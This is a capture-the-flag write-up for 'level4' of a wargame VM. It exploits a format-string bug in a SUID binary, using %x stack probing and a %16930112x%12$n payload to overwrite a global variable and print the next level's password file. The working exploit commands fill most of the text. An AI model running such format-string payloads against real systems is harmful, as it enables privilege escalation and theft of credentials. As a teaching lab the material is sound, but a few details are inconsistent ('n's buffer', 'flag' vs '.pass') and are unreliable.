# level4

## 1. Connect to the VM

Use the password obtained from `level3`:

```bash
ssh level4@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `level5` and has the SUID bit set. It therefore runs
with `level5` privileges.

The important lines are:

```c
int p(char *format)
{
    return printf(format);
}

fgets(buffer, 512, stdin);
p(buffer);
if (m == 16930116)
    system("/bin/cat /home/user/level5/.pass");
```

The user controls `buffer`, and it is passed directly to `printf` via `p` as
the format string. This creates a format-string vulnerability.

The objective is to use `printf` to write the value `16930116` into the global
variable `m`.

## 3. Find the address of `m`

Disassemble the binary:

```bash
objdump -d -M intel level4
```

The comparison with `16930116` is performed here:

```asm
mov eax,ds:0x8049810
cmp eax,0x1025544
```

Therefore:

```text
m address    = 0x08049810
16930116     = 0x1025544
```

On a little-endian x86 machine, the address must be written as:

```text
\x10\x98\x04\x08
```

## 4. Find the format-string index

The `%x` format reads values from the stack. Place `BBBB` at the beginning of
the input and print several stack values:

```text
python -c 'print "BBBB " + "%x "*15' | ./level4
BBBB b7ff26b0 bffffcb4 b7fd0ff4 0 0 bffffc78 804848d bffffa70 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078
```

`0x42` is the ASCII value of `B`, so `42424242` represents `BBBB`. These are
the first four bytes of our buffer.

It appears as the twelfth value read by `printf`. The extra indirection through
`p` adds two additional stack frames between `printf`'s arguments and `n`'s
buffer, shifting the index from 4 (as in level3) to 12.

We can therefore access the first four bytes of our input with:

```text
%12$
```

## 5. Use `%n`

The `%n` format does not print anything. Instead, it writes the number of
characters already printed into an address.

With `%12$n`, `printf` uses its twelfth stack value as the destination address.
We place the address of `m` in the first four bytes of the input, so `%12$n`
writes into `m`.

We need exactly `16930116` characters to be printed before `%12$n`. Rather than
literal padding, the `%Nx` specifier prints a value using `N` character-wide
field, generating the required count efficiently:

```text
4 address bytes + 16930112 characters from %16930112x = 16930116
```

The payload is:

```text
[address of m][%16930112x][%12$n]
```

## 6. Exploit the binary

Run:

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
```

`printf` prints `16930116` characters and `%12$n` writes that value into `m`.
The condition becomes true and the program executes
`/bin/cat /home/user/level5/.pass`.

This prints the password stored in `flag`.
